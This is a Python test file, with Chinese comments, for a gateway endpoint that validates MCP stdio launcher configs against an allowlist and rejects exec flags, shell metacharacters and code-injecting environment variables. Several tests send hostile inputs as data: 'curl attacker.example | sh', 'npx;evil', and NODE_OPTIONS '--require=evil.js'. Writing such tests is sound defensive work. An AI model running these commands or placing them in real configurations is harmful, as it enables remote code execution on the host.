"""A5（2026-10-07 反馈核实批）：MCP stdio launcher 校验。

``PUT /api/mcp/config`` 的 ``command``/``args`` 会原样变成 gateway 主机上的
进程 argv——admin 会话被盗即宿主机 RCE，此前零纵深。本批移植上游三层校验：

  1. command 必须是单个可执行名（无路径分隔符/空白/shell 元字符）且在
     allowlist 内（默认 ``{npx, uvx}``，扩展点 = extensions_config.json 顶层
     ``mcp_stdio_launcher_allowlist`` 键，并集语义；不碰 config.yaml）；
  2. 任意执行旗标（``-c``/``-e``/``--eval`` 等）无条件拒绝——包启动器只查
     其选项区（包名之后是 server 自己的 argv，``-c`` 常是 "config"）；
  3. 代码注入型环境变量（``NODE_OPTIONS``/``PYTHONPATH``/``LD_PRELOAD`` 等）
     拒绝。

走真实 router + TestClient（守卫是路由依赖，直调 handler 证明不了任何事）。
"""

from __future__ import annotations

import json
from pathlib import Path
from types import SimpleNamespace

import pytest
from fastapi import FastAPI, Request
from fastapi.testclient import TestClient
from starlette.middleware.base import BaseHTTPMiddleware

from app.gateway.authz import _ALL_PERMISSIONS, AuthContext
from app.gateway.routers import mcp as mcp_router


def _server(command=None, args=None, env=None, stype="stdio", url=None):
    payload: dict = {"enabled": True, "type": stype}
    if command is not None:
        payload["command"] = command
    if args is not None:
        payload["args"] = args
    if env is not None:
        payload["env"] = env
    if url is not None:
        payload["url"] = url
    return payload


def _payload(server) -> dict:
    return {"mcp_servers": {"target": server}}


@pytest.fixture()
def config_file(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    path = tmp_path / "extensions_config.json"
    path.write_text(json.dumps({"mcpServers": {}}), encoding="utf-8")
    monkeypatch.setenv("DEER_FLOW_EXTENSIONS_CONFIG_PATH", str(path))
    mcp_router.reload_extensions_config()
    return path


def _admin_client() -> TestClient:
    app = FastAPI()

    class _Stamp(BaseHTTPMiddleware):
        async def dispatch(self, request: Request, call_next):
            user = SimpleNamespace(id="u-1", system_role="admin")
            request.state.auth = AuthContext(user=user, permissions=list(_ALL_PERMISSIONS))
            request.state.user = user
            return await call_next(request)

    app.add_middleware(_Stamp)
    app.include_router(mcp_router.router)
    return TestClient(app)


def _user_client() -> TestClient:
    app = FastAPI()

    class _Stamp(BaseHTTPMiddleware):
        async def dispatch(self, request: Request, call_next):
            user = SimpleNamespace(id="u-1", system_role="user")
            request.state.auth = AuthContext(user=user, permissions=list(_ALL_PERMISSIONS))
            request.state.user = user
            return await call_next(request)

    app.add_middleware(_Stamp)
    app.include_router(mcp_router.router)
    return TestClient(app)


class TestExecFlagRejection:
    def test_npx_dash_c_rejected_and_file_untouched(self, config_file: Path) -> None:
        before = config_file.read_text(encoding="utf-8")
        with _admin_client() as client:
            response = client.put("/api/mcp/config", json=_payload(_server("npx", ["-c", "curl attacker.example | sh"])))

        assert response.status_code == 400
        assert "arbitrary code" in response.json()["detail"]
        assert config_file.read_text(encoding="utf-8") == before

    def test_eval_equals_spelling_rejected(self, config_file: Path) -> None:
        with _admin_client() as client:
            response = client.put("/api/mcp/config", json=_payload(_server("npx", ["--eval=process.exit(1)", "pkg"])))

        assert response.status_code == 400

    def test_uvx_call_flag_rejected(self, config_file: Path) -> None:
        with _admin_client() as client:
            response = client.put("/api/mcp/config", json=_payload(_server("uvx", ["--call", "evil", "pkg"])))

        assert response.status_code == 400

    def test_flag_after_package_name_is_server_argv(self, config_file: Path) -> None:
        """包名之后的 ``-c`` 是 server 自己的 CLI（常为 config），必须放行。"""
        with _admin_client() as client:
            response = client.put(
                "/api/mcp/config",
                json=_payload(_server("npx", ["-y", "some-mcp-server", "-c", "config.json"])),
            )

        assert response.status_code == 200

    def test_value_consuming_flag_keeps_option_region_open(self, config_file: Path) -> None:
        """``npx -p . -c 'cmd'``：``-p`` 吃掉 ``.``，``-c`` 仍在选项区 → 拒绝。"""
        with _admin_client() as client:
            response = client.put("/api/mcp/config", json=_payload(_server("npx", ["-p", ".", "-c", "evil"])))

        assert response.status_code == 400


class TestAllowlist:
    def test_non_allowlisted_command_rejected(self, config_file: Path) -> None:
        with _admin_client() as client:
            response = client.put("/api/mcp/config", json=_payload(_server("bash", ["-c", "echo hi"])))

        assert response.status_code == 400
        assert "disallowed stdio command" in response.json()["detail"]

    def test_path_separated_command_rejected(self, config_file: Path) -> None:
        with _admin_client() as client:
            response = client.put("/api/mcp/config", json=_payload(_server("/bin/sh", ["-c", "id"])))

        assert response.status_code == 400

    def test_command_with_whitespace_rejected(self, config_file: Path) -> None:
        with _admin_client() as client:
            response = client.put("/api/mcp/config", json=_payload(_server("npx -y pkg")))

        assert response.status_code == 400

    def test_stdio_without_command_rejected(self, config_file: Path) -> None:
        with _admin_client() as client:
            response = client.put("/api/mcp/config", json=_payload(_server(args=["-y", "pkg"])))

        assert response.status_code == 400
        assert "requires a command" in response.json()["detail"]

    def test_extensions_config_allowlist_extends_default(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        """顶层 ``mcp_stdio_launcher_allowlist`` 键追加启动器（并集语义）。"""
        path = tmp_path / "extensions_config.json"
        path.write_text(
            json.dumps({"mcpServers": {}, "mcp_stdio_launcher_allowlist": ["docker"]}),
            encoding="utf-8",
        )
        monkeypatch.setenv("DEER_FLOW_EXTENSIONS_CONFIG_PATH", str(path))
        mcp_router.reload_extensions_config()

        with _admin_client() as client:
            response = client.put("/api/mcp/config", json=_payload(_server("docker", ["run", "--rm", "some-mcp"])))

        assert response.status_code == 200


class TestCommandShapeAndEnv:
    def test_shell_metachar_in_command_rejected(self, config_file: Path) -> None:
        with _admin_client() as client:
            response = client.put("/api/mcp/config", json=_payload(_server("npx;evil", ["-y", "pkg"])))

        assert response.status_code == 400

    def test_code_injecting_env_var_rejected(self, config_file: Path) -> None:
        with _admin_client() as client:
            response = client.put(
                "/api/mcp/config",
                json=_payload(_server("npx", ["-y", "pkg"], env={"NODE_OPTIONS": "--require=evil.js"})),
            )

        assert response.status_code == 400
        assert "environment variable" in response.json()["detail"]

    def test_ordinary_env_var_passes(self, config_file: Path) -> None:
        with _admin_client() as client:
            response = client.put(
                "/api/mcp/config",
                json=_payload(_server("npx", ["-y", "pkg"], env={"GITHUB_TOKEN": "ghp_x"})),
            )

        assert response.status_code == 200


class TestTransportAndAuth:
    def test_http_server_unaffected(self, config_file: Path) -> None:
        with _admin_client() as client:
            response = client.put(
                "/api/mcp/config",
                json=_payload(_server(stype="http", url="https://mcp.example.com/sse")),
            )

        assert response.status_code == 200

    def test_legitimate_stdio_roundtrip_passes(self, config_file: Path) -> None:
        with _admin_client() as client:
            response = client.put(
                "/api/mcp/config",
                json=_payload(_server("npx", ["-y", "@modelcontextprotocol/server-github"])),
            )

        assert response.status_code == 200
        assert "target" in json.loads(config_file.read_text(encoding="utf-8"))["mcpServers"]

    def test_non_admin_still_403_before_validation(self, config_file: Path) -> None:
        """鉴权依赖先于校验：非 admin 拿 403 而非 400。"""
        with _user_client() as client:
            response = client.put("/api/mcp/config", json=_payload(_server("bash", ["-c", "id"])))

        assert response.status_code == 403
